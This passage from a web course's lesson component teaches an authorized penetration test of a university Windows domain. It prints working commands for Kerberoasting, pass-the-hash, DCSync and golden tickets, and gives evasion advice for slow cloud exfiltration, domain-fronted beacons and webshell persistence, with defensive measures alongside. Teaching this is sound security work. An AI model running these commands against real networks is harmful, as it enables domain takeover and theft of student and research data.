                <li><b>Asset inventory</b> that&apos;s actually accurate — how many cameras do you have? How many printers? You can&apos;t protect what you can&apos;t count.</li>
              </ul>
            </Callout>
          </Section>

          <Section title="G — privilege escalation: Kerberoasting">
            <p>The easy road on a university network: service accounts (<span className="eng">SPN</span>s) with passwords unchanged for years.</p>
            <Code lang="bash">{`# 1) list all SPN-bearing accounts:
GetUserSPNs.py state-uni.edu/student.user:Pass123 -dc-ip 203.0.113.10 -request

# 2) result: TGS tickets crackable offline:
hashcat -m 13100 spn-hashes.txt rockyou.txt -r best64.rule

# 3) "Library2019!" for sql_svc → MSSQL admin → xp_cmdshell → SYSTEM`}</Code>
            <Callout kind="good" title="Defense">
              <ul>
                <li>Long passwords (25+ chars) for every SPN account.</li>
                <li>Group Managed Service Accounts (gMSA) — Windows rotates them automatically.</li>
                <li>Honey-SPN: a decoy SPN no one uses; any TGS request for it = APT inside.</li>
              </ul>
            </Callout>
          </Section>

          <Section title="H — lateral movement across VLANs">
            <p>Universities are culturally &quot;open&quot; and VLAN segmentation is usually weak. A staff workstation talks to the printer admin VLAN, which talks to the camera VLAN. Each hop reuses a credential collected from the previous layer.</p>
            <Terminal lines={[
              { p: "# pass-the-hash from a workstation to the print server:" },
              { p: "psexec.py -hashes :aad3b...:31d6cf... administrator@198.51.100.50" },
              { p: "" },
              { p: "# WinRM into a file server:" },
              { p: "evil-winrm -i 198.51.100.60 -u svc_backup -H 4f3d..." },
            ]} />
          </Section>

          <Section title="I — domain dominance">
            <p>After Domain Admin (via Kerberoasting or NTLM relay over PetitPotam):</p>
            <Code lang="bash">{`# DCSync — pull every hash in the domain straight from the DC:
secretsdump.py state-uni.edu/admin@dc01.state-uni.edu -just-dc

# Result: every account hash, including krbtgt (the keys to the kingdom).
# Golden Ticket = persistence even if the admin rotates passwords:
ticketer.py -nthash <krbtgt-hash> -domain-sid <SID> -domain state-uni.edu admin`}</Code>
            <Callout kind="good" title="Defense — what actually works">
              <ul>
                <li><b>Tier 0/1/2 isolation:</b> Domain Admins log in only on DCs.</li>
                <li><b>Rotate the krbtgt hash twice a year</b> (kills old golden tickets).</li>
                <li><b>Microsoft LAPS</b> + <b>Privileged Access Management (PAM)</b>.</li>
                <li><b>Defender for Identity</b> catches DCSync with high precision.</li>
              </ul>
            </Callout>
          </Section>

          <Section title="J — the jewels — what actually matters in a university">
            <ol>
              <li><b>Banner / PeopleSoft</b> — student records: names, SSN, financial aid, transcripts.</li>
              <li><b>Research data</b> — federally funded work (DARPA, DoE, NIH). The real APT prize.</li>
              <li><b>Financial systems</b> — payroll, grants, payroll redirects.</li>
              <li><b>Email (Exchange / M365)</b> — everything passes through. Admin rights enable impersonation.</li>
              <li><b>Lab networks</b> — sometimes a small ICS (teaching reactors, biosafety labs). Highest sensitivity.</li>
            </ol>
          </Section>

          <Section title="K → Y — persistence and exfil">
            <ul>
              <li><b>Persistence:</b> golden ticket + scheduled task + WMI subscription + a webshell on a low-traffic subdomain.</li>
              <li><b>Tiered access:</b> three separate footholds as in the <span className="eng">web-vuln-research</span> lesson.</li>
              <li><b>Exfil:</b> never 50 GB at once. <b>Rclone</b> to the university&apos;s own OneDrive (looks legitimate) at ~5 GB/day over weeks.</li>
              <li><b>Beacons</b> only inside campus working hours, via domain fronting on Cloudflare/Azure.</li>
            </ul>
          </Section>

          <Section title="Z — cleanup and client report">
            <ul>
              <li>Remove all temporary tooling (but keep a logged copy for the client).</li>
              <li>Restore any password you changed (don&apos;t break production).</li>
              <li>Report: precise timeline, every CVE, every misconfig, every weak password, every exposed IoT.</li>
              <li>Prioritized recommendations: fix in a week / month / quarter.</li>
              <li>Retest after remediations (typically 90 days).</li>
            </ul>
          </Section>

          <Section title="MITRE ATT&CK mapping for the full chain">
            <Code lang="text">{`Recon:        T1595 (Active Scanning), T1589 (Gather Victim Identity)
Initial:      T1566.001 (Spearphishing), T1190 (Public-Facing Exploit), T1110.003 (Spraying)
Execution:    T1059.001 (PowerShell), T1059.003 (Cmd)
Persistence:  T1053.005 (Scheduled Task), T1505.003 (Webshell), T1136 (New Account)
Priv Esc:     T1558.003 (Kerberoasting), T1068 (Exploitation for Priv Esc)
Defense Evd:  T1027 (Obfuscation), T1070.004 (File Deletion)
Credentials:  T1003.001 (LSASS), T1003.006 (DCSync)
Discovery:    T1018 (Remote System), T1087 (Account Discovery)
Lateral:      T1021.002 (SMB), T1021.006 (WinRM), T1550.002 (PtH)
Collection:   T1005 (Local Data), T1213 (Internal Repo)
C2:           T1071.001 (Web), T1090 (Proxy), T1568 (Dynamic Resolution)
Exfil:        T1567.002 (Cloud Storage), T1041 (Over C2)
Impact:       T1486 (Encrypt) — not in training, documentation only`}</Code>
          </Section>

          <Section title="Real-world cases worth studying">
            <ul>
              <li><b>UC San Diego / UCSF (2020)</b> — ransomware via phishing → DCSync → encryption.</li>
              <li><b>Newcastle University (2020)</b> — DoppelPaymer, 6-month recovery.</li>
              <li><b>MIT lab pivot via printer (2017)</b> — researchers demonstrated a hop from a Konica MFP to a DC.</li>
              <li><b>Mirai (2016)</b> — Hikvision cameras on a campus network conscripted into the DDoS botnet.</li>
              <li><b>Operation Newscaster (Charming Kitten)</b> — long-running phishing of US academic researchers, public since 2014.</li>
            </ul>
          </Section>
        </>}
      />
    </LessonShell>
  );
}
